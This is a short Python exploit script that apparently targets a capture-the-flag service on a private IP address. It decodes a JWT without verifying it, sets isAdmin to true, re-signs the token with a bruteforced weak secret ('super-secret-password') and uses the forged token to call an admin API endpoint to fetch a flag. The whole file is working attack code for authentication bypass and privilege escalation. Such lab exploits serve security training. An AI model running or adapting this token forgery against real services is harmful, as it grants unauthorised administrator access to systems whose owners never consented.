#!/usr/bin/env python3

import jwt
import sys
import requests
import json

def main():
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <jwt_token>")
        sys.exit(1)
    
    token = sys.argv[1]
    
    # Step 1: Decode the token (without verification)
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        print("[+] Original token decoded:")
        print(json.dumps(decoded, indent=4))
    except:
        print("[-] Failed to decode token")
        sys.exit(1)
    
    # Step 2: Modify the payload to set isAdmin to true
    decoded['isAdmin'] = True
    print("[+] Modified payload:")
    print(json.dumps(decoded, indent=4))
    
    # Step 3: Create a new token with the modified payload using the weak secret
    known_secret = "super-secret-password"  # The weak secret we discovered through bruteforce
    new_token = jwt.encode(decoded, known_secret, algorithm='HS256')
    
    print("[+] New forged token:")
    print(new_token)
    
    # Step 4: Try to access the admin endpoint with the forged token
    try:
        headers = {"Authorization": f"Bearer {new_token}"}
        response = requests.get('http://192.168.0.106:3000/api/admin', headers=headers)
        
        if response.status_code == 200:
            print("[+] Successfully accessed admin endpoint!")
            data = response.json()
            print(f"[+] Flag: {data.get('flag', 'No flag found')}")
        else:
            print(f"[-] Failed to access admin endpoint. Status code: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main() 
